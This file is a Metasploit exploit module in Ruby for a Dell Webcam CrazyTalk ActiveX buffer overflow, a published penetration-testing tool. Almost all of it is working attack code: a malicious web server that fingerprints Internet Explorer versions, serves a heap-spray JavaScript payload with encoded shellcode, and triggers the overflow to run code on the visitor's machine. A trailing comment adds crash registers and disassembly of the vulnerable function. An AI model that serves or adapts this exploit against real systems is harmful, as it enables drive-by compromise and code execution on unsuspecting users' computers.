# wait##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Dell Webcam CrazyTalk ActiveX BackImage Vulnerability",
			'Description'    => %q{
					This module exploits a vulnerability in Dell Webcam's CrazyTalk component.
				Specifically, when supplying a long string for a file path to the BackImage
				property, an overflow may occur after checking certain file extension names,
				resulting in remote code execution under the context of the user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'rgod',   #Discovery, PoC
					'sinn3r'  #Metasploit
				],
			'References'     =>
				[
					[ 'URL', 'http://www.dell.com/support/drivers/us/en/04/DriverDetails/DriverFileFormats?c=us&l=en&s=bsd&cs=04&DriverId=R230103' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/18621/' ],
					[ 'OSVDB', 80205]
				],
			'Payload'        =>
				{
					'BadChars'        => "\x00",
					'StackAdjustment' => -3500
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'         => "seh",
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[ 'IE 6 on Windows XP SP3', { 'Offset' => '0x600'} ],
					[ 'IE 7 on Windows XP SP3', { 'Offset' => '0x600'} ],
					[ 'IE 7 on Windows Vista',  { 'Offset' => '0x600'} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Mar 19 2012",
			'DefaultTarget'  => 0))
	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
			return targets[1]  #IE 6 on Windows XP SP3
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
			return targets[2]  #IE 7 on Windows XP SP3
		elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
			return targets[3]  #IE 7 on Windows Vista
		else
			return nil
		end
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		my_target = get_target(agent)

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if my_target.nil?
			print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		print_status("#{cli.peerhost}:#{cli.peerport} - Target set: #{my_target.name}")

		p = payload.encoded
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))

		js = <<-JS
		var heap_obj = new heapLib.ie(0x20000);
		var code = unescape("#{js_code}");
		var nops = unescape("#{js_nops}");

		while (nops.length < 0x80000) nops += nops;
		var offset = nops.substring(0, #{my_target['Offset']});
		var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

		while (shellcode.length < 0x40000) shellcode += shellcode;
		var block = shellcode.substring(0, (0x80000-6)/2);

		heap_obj.gc();

		for (var i=1; i < 0x300; i++) {
			heap_obj.alloc(block);
		}
		JS

		js = heaplib(js, {:noobfu => true})

		html = <<-EOS
		<html>
		<head>
		<script>
		#{js}
		</script>
		</head>
		<body>
		<object classid='clsid:13149882-F480-4F6B-8C6A-0764F75B99ED' id='target'></object>
		<script>
		var arg = "\x0c";
		while (arg.length < 2000) arg += arg;
		target.BackImage = arg.substring(0, 2000);
		</script>
		</html>
		EOS

		print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

end

=begin
The tmp path has the username that we cannot accurately control remotely, so there's
no point to try to overwrite the stack precisely.

targetFile = "C:\PROGRA~1\COMMON~1\REALLU~1\CTPLAY~1\CRAZYT~1.OCX"
prototype  = "Invoke_Unknown BackImage As String"
memberName = "BackImage"
progid     = "CRAZYTALK4Lib.CrazyTalk4"
argCount   = 1

(d4c.d9c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=10005970 ecx=0000b3a0 edx=020bf34f esi=03422f98 edi=020bf5ac
eip=41414141 esp=020bf33c ebp=020bf390 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
<Unloaded_Ed20.dll>+0x41414140:
41414141 ??              ???

======

.text:03854F59 lea     ecx, [esp+33Ch+Str1]
.text:03854F5D push    offset a_asp    ; ".asp"
.text:03854F62 push    ecx             ; Str1
.text:03854F63 mov     [esp+344h+var_308], 0
.text:03854F68 call    ebx ; _stricmp           <-- Nope

.text:03854F71 lea     edx, [esp+328h+Str1]
.text:03854F75 push    offset a_php    ; ".php"
.text:03854F7A push    edx             ; Str1
.text:03854F7B call    ebx ; _stricmp           <--- Still nope

.text:03854F84 mov     ebx, [esp+328h+Dest]
.text:03854F8B lea     eax, [esp+328h+Str1]
.text:03854F8F lea     ecx, [esp+328h+Filename]
.text:03854F96 push    eax
.text:03854F97 add     esi, 3B44h
.text:03854F9D push    ecx
.text:03854F9E push    esi
.text:03854F9F push    offset aSSS     ; "%s%s%s"
.text:03854FA4 push    ebx             ; Dest
.text:03854FA5 call    ds:sprintf
=end
            
